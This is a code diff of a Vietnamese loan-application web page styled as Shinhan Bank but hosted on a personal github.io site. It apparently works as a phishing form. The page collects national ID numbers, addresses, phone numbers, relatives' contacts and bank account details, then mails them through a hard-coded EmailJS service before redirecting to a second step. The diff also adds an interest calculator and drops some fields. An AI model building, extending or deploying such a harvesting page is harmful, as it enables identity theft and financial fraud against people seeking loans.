@@ -243,7 +243,7 @@
         }
         .button-group {
             display: flex;
-            justify-content: Ascending;
+            justify-content: center;
             gap: 15px;
             margin-top: 15px;
         }
@@ -318,6 +318,22 @@
                 box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
             }
         }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+        th, td {
+            border: 1px solid #b3cde0;
+            padding: 8px;
+            text-align: right;
+        }
+        th {
+            background-color: #e6f0fa;
+            color: #0033a0;
+            font-weight: 700;
+        }
     </style>
 </head>
 <body>
@@ -386,28 +402,8 @@
                 </div>
 
                 <div class="form-group">
-                    <label class="form-label">Quê quán <span>*</span></label>
-                    <input type="text" class="form-control long" id="hometown">
-                </div>
-
-                <div class="form-group">
                     <label class="form-label">Số định danh cá nhân (CCCD/CMND) <span>*</span></label>
                     <input type="text" class="form-control short" id="idNumber">
-                </div>
-
-                <div class="row-group">
-                    <div class="form-group">
-                        <label class="form-label">Ngày cấp CMND/CCCD <span>*</span></label>
-                        <input type="text" class="form-control ultra-short" id="idIssueDate">
-                    </div>
-                    <div class="form-group">
-                        <label class="form-label">Quốc tịch <span>*</span></label>
-                        <select class="form-select ultra-short" id="nationality">
-                            <option value="" disabled selected>Chọn quốc tịch</option>
-                            <option value="Việt Nam">Việt Nam</option>
-                            <option value="Khác">Khác</option>
-                        </select>
-                    </div>
                 </div>
 
                 <div class="form-group form-group-bordered">
@@ -437,7 +433,7 @@
 
                 <div class="form-group">
                     <label class="form-label">Hình thức vay <span>*</span></label>
-                    <select class="form-select short" id="loanType">
+                    <select class="form-select short" id="loanType" onchange="updateInterestRate()">
                         <option value="" disabled selected>Chọn Hình thức vay</option>
                         <option value="Vay tín chấp">Vay tín chấp</option>
                         <option value="Vay thế chấp">Vay thế chấp</option>
@@ -490,6 +486,11 @@
                 </div>
 
                 <div class="form-group">
+                    <label class="form-label">Lãi suất (%/năm) <span>*</span></label>
+                    <input type="number" class="form-control short" id="interest" step="0.1" readonly>
+                </div>
+
+                <div class="form-group">
                     <label class="form-label">Thu nhập hàng tháng (VND) <span>*</span></label>
                     <input type="text" class="form-control short" id="income">
                 </div>
@@ -523,43 +524,24 @@
                     </select>
                 </div>
 
-                <div class="form-group">
-                    <label class="form-label">Số điện thoại người thân <span>*</span></label>
-                    <input type="text" class="form-control short" id="companyPhone">
-                </div>
-
-                <div class="form-group">
-                    <label class="form-label">Quan hệ <span>*</span></label>
-                    <select class="form-select short" id="companyAddress">
-                        <option value="" disabled selected>Chọn quan hệ</option>
-                        <option value="Bạn bè">Bạn bè</option>
-                        <option value="Anh">Anh</option>
-                        <option value="Chị">Chị</option>
-                        <option value="Em">Em</option>
-                        <option value="Đồng nghiệp">Đồng nghiệp</option>
-                        <option value="Vợ/Chồng">Vợ/Chồng</option>
-                        <option value="Bố">Bố</option>
-                        <option value="Mẹ">Mẹ</option>
-                        <option value="Khác">Khác</option>
-                    </select>
-                </div>
-
                 <div class="row-group">
                     <div class="form-group">
-                        <label class="form-label">Có nợ xấu <span>*</span></label>
-                        <select class="form-select ultra-short" id="hasBadDebt">
-                            <option value="" disabled selected>Chọn</option>
-                            <option value="Có">Có</option>
-                            <option value="Không">Không</option>
-                        </select>
+                        <label class="form-label">Số điện thoại người thân <span>*</span></label>
+                        <input type="text" class="form-control short" id="companyPhone">
                     </div>
-
                     <div class="form-group">
-                        <label class="form-label">Có nợ chú ý <span>*</span></label>
-                        <select class="form-select ultra-short" id="hasHighDebt">
-                            <option value="" disabled selected>Chọn</option>
-                            <option value="Có">Có</option>
-                            <option value="Không">Không</option>
+                        <label class="form-label">Quan hệ <span>*</span></label>
+                        <select class="form-select short" id="companyAddress">
+                            <option value="" disabled selected>Chọn quan hệ</option>
+                            <option value="Bạn bè">Bạn bè</option>
+                            <option value="Anh">Anh</option>
+                            <option value="Chị">Chị</option>
+                            <option value="Em">Em</option>
+                            <option value="Đồng nghiệp">Đồng nghiệp</option>
+                            <option value="Vợ/Chồng">Vợ/Chồng</option>
+                            <option value="Bố">Bố</option>
+                            <option value="Mẹ">Mẹ</option>
+                            <option value="Khác">Khác</option>
                         </select>
                     </div>
                 </div>
@@ -612,8 +594,20 @@
 
             <hr class="section-divider">
 
+            <div class="mb-2">
+                <label class="section-title">KẾT QUẢ TÍNH TOÁN</label>
+                <div id="loanResult">
+                    <table id="resultTable">
+                        <tr><th>Tháng</th><th>Gốc (VND)</th><th>Lãi (VND)</th><th>Tổng (VND)</th><th>Dư nợ (VND)</th></tr>
+                    </table>
+                </div>
+            </div>
+
+            <hr class="section-divider">
+
             <div class="button-group">
                 <a href="https://vaytieudung.github.io/shinhanbank/" class="btn btn-secondary">QUAY LẠI</a>
+                <button type="button" class="btn btn-primary" onclick="calculateLoan()">TÍNH TOÁN</button>
                 <button type="submit" class="btn btn-primary">BƯỚC KẾ TIẾP</button>
             </div>
         </form>
@@ -641,9 +635,7 @@
     <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS with your Public Key
         emailjs.init('OrBsI926QI2_xBh1f');
-
         let userData = {};
 
         function getCurrentDate() {
@@ -694,16 +686,74 @@
             }
         }
 
+        function updateInterestRate() {
+            const loanType = document.getElementById('loanType').value;
+            const interestInput = document.getElementById('interest');
+            const rates = {
+                'Vay tín chấp': 11,
+                'Vay thế chấp': 5.5,
+                'Vay thấu chi': 7.0,
+                'Vay trả góp': 7.4
+            };
+            interestInput.value = loanType && rates[loanType] ? rates[loanType] : '';
+        }
+
+        function calculateLoan() {
+            const loanType = document.getElementById('loanType').value;
+            const amount = parseInt(document.getElementById('loanAmountInput').value);
+            const term = parseInt(document.getElementById('loanTerm').value);
+            const interestRate = parseFloat(document.getElementById('interest').value) / 100 / 12;
+
+            if (!loanType || isNaN(amount) || isNaN(term) || isNaN(interestRate)) {
+                $('#formError').text('Vui lòng điền đầy đủ thông tin khoản vay.').show();
+                return;
+            }
+
+            const r = interestRate;
+            const n = term;
+            const p = amount;
+            const monthlyPayment = Math.round(p * (r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1));
+            let remainingBalance = amount;
+            let totalInterest = 0;
+
+            const rows = [];
+            for (let i = 1; i <= term; i++) {
+                const interest = Math.round(remainingBalance * interestRate);
+                const principal = monthlyPayment - interest;
+                totalInterest += interest;
+                remainingBalance -= principal;
+                if (i === term) remainingBalance = 0;
+                rows.push({
+                    month: i,
+                    principal: principal,
+                    interest: interest,
+                    total: monthlyPayment,
+                    balance: remainingBalance
+                });
+            }
+
+            let resultText = '<table id="resultTable">';
+            resultText += '<tr><th>Tháng</th><th>Gốc (VND)</th><th>Lãi (VND)</th><th>Tổng (VND)</th><th>Dư nợ (VND)</th></tr>';
+            resultText += rows.map(row => `
+                <tr>
+                    <td>${row.month}</td>
+                    <td>${row.principal.toLocaleString('vi-VN')}</td>
+                    <td>${row.interest.toLocaleString('vi-VN')}</td>
+                    <td>${row.total.toLocaleString('vi-VN')}</td>
+                    <td>${Math.max(0, row.balance).toLocaleString('vi-VN')}</td>
+                </tr>
+            `).join('');
+            resultText += '</table>';
+            document.getElementById('loanResult').innerHTML = resultText;
+        }
+
         function validateForm() {
             const requiredFields = [
                 { id: 'fullName', selector: '#fullName', label: 'Họ và Tên' },
                 { id: 'dob', selector: '#dob', label: 'Ngày sinh' },
                 { id: 'gender', selector: '#gender', label: 'Giới tính' },
                 { id: 'contactAddress', selector: '#contactAddress', label: 'Địa chỉ thường trú' },
-                { id: 'hometown', selector: '#hometown', label: 'Quê quán' },
                 { id: 'idNumber', selector: '#idNumber', label: 'Số định danh cá nhân (CCCD/CMND)' },
-                { id: 'idIssueDate', selector: '#idIssueDate', label: 'Ngày cấp CMND/CCCD' },
-                { id: 'nationality', selector: '#nationality', label: 'Quốc tịch' },
                 { id: 'idIssuePlace', selector: '#idIssuePlace', label: 'Nơi cấp' },
                 { id: 'phoneNumber', selector: '#phoneNumber', label: 'Số điện thoại' },
                 { id: 'email', selector: '#email', label: 'E-mail' },
@@ -716,8 +766,6 @@
                 { id: 'loanPurpose', selector: '#loanPurpose', label: 'Mục đích vay' },
                 { id: 'companyPhone', selector: '#companyPhone', label: 'Số điện thoại người thân' },
                 { id: 'companyAddress', selector: '#companyAddress', label: 'Quan hệ' },
-                { id: 'hasBadDebt', selector: '#hasBadDebt', label: 'Có nợ xấu' },
-                { id: 'hasHighDebt', selector: '#hasHighDebt', label: 'Có nợ chú ý' },
                 { id: 'accountHolderName', selector: '#accountHolderName', label: 'Tên chủ tài khoản' },
                 { id: 'accountNumber', selector: '#accountNumber', label: 'Số tài khoản' },
                 { id: 'bankName', selector: '#bankName', label: 'Tên ngân hàng' }
@@ -744,10 +792,7 @@
             $('#dob').val(userData.dob || '');
             $('#gender').val(userData.gender || '');
             $('#contactAddress').val(userData.contactAddress || '');
-            $('#hometown').val(userData.hometown || '');
             $('#idNumber').val(userData.idNumber || '');
-            $('#idIssueDate').val(userData.idIssueDate || '');
-            $('#nationality').val(userData.nationality || '');
             $('#idIssuePlace').val(userData.idIssuePlace || '');
             $('#phoneNumber').val(userData.phoneNumber || '');
             $('#email').val(userData.email || '');
@@ -759,8 +804,6 @@
             $('#loanPurpose').val(userData.loanPurpose || '');
             $('#companyPhone').val(userData.companyPhone || '');
             $('#companyAddress').val(userData.companyAddress || '');
-            $('#hasBadDebt').val(userData.hasBadDebt || '');
-            $('#hasHighDebt').val(userData.hasHighDebt || '');
             $('#accountHolderName').val(userData.accountHolderName || '');
             $('#accountNumber').val(userData.accountNumber || '');
             $('#bankName').val(userData.bankName || '');
@@ -776,10 +819,7 @@
                     dob: $('#dob').val().trim(),
                     gender: $('#gender').val(),
                     contactAddress: $('#contactAddress').val().trim(),
-                    hometown: $('#hometown').val().trim(),
                     idNumber: $('#idNumber').val().trim(),
-                    idIssueDate: $('#idIssueDate').val().trim(),
-                    nationality: $('#nationality').val(),
                     idIssuePlace: $('#idIssuePlace').val(),
                     phoneNumber: $('#phoneNumber').val().trim(),
                     email: $('#email').val().trim(),
@@ -792,8 +832,6 @@
                     loanPurpose: $('#loanPurpose').val(),
                     companyPhone: $('#companyPhone').val().trim(),
                     companyAddress: $('#companyAddress').val(),
-                    hasBadDebt: $('#hasBadDebt').val(),
-                    hasHighDebt: $('#hasHighDebt').val(),
                     accountHolderName: $('#accountHolderName').val().trim(),
                     accountNumber: $('#accountNumber').val().trim(),
                     bankName: $('#bankName').val(),
@@ -802,18 +840,13 @@
                 };
                 console.log('Submitting userData:', userData);
 
-                // Save to localStorage
                 if (saveToLocalStorage()) {
-                    // Send email using EmailJS
                     emailjs.send('service_60tgxof', 'template_uhyb8ve', {
                         full_name: userData.fullName,
                         dob: userData.dob,
                         gender: userData.gender,
                         contact_address: userData.contactAddress,
-                        hometown: userData.hometown,
                         id_number: userData.idNumber,
-                        id_issue_date: userData.idIssueDate,
-                        nationality: userData.nationality,
                         id_issue_place: userData.idIssuePlace,
                         phone_number: userData.phoneNumber,
                         email: userData.email,
@@ -826,15 +859,12 @@
                         loan_purpose: userData.loanPurpose,
                         company_phone: userData.companyPhone,
                         company_address: userData.companyAddress,
-                        has_bad_debt: userData.hasBadDebt,
-                        has_high_debt: userData.hasHighDebt,
                         account_holder_name: userData.accountHolderName,
                         account_number: userData.accountNumber,
                         bank_name: userData.bankName
                     })
                     .then(function(response) {
                         console.log('Email sent successfully:', response);
-                        // Redirect to the next step
                         window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
                     }, function(error) {
                         console.error('Failed to send email:', error);
@@ -847,5 +877,6 @@
             }
         });
     </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'93e83c68aaf4bf9a',t:'MTc0NzAzNTI5MS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
 </body>
 </html>
